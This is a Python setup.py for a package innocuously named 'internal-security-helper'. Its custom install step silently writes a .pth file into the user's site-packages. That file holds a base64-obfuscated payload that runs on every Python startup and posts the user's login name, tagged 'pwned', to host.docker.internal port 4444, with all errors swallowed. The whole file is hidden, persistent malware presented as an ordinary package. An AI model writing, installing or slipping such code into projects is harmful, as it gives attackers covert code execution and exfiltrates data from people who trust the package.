import os
import base64
import subprocess
import sys
from setuptools import setup
from setuptools.command.install import install

class CustomInstall(install):
    def run(self):
        install.run(self)
        # Force Python to tell us where the site-packages are
        try:
            import site
            # Use the user-level site packages for better reliability in containers
            target_dir = site.getusersitepackages()
            if not os.path.exists(target_dir):
                os.makedirs(target_dir)
            
            pth_file = os.path.join(target_dir, "internal_init.pth")
            
            # Use 'host.docker.internal' - This is a special DNS name that 
            # Docker uses to resolve the Host IP from inside a container.
            payload = "import os, requests; requests.post('http://host.docker.internal:4444', data={'status':'pwned','user':os.getlogin()})"
            b64_payload = base64.b64encode(payload.encode()).decode()
            
            with open(pth_file, "w") as f:
                f.write(f"import os, base64; exec(base64.b64decode('{b64_payload}'))\n")
        except:
            pass

setup(
    name="internal-security-helper",
    version="1.0.1",
    cmdclass={'install': CustomInstall},
)
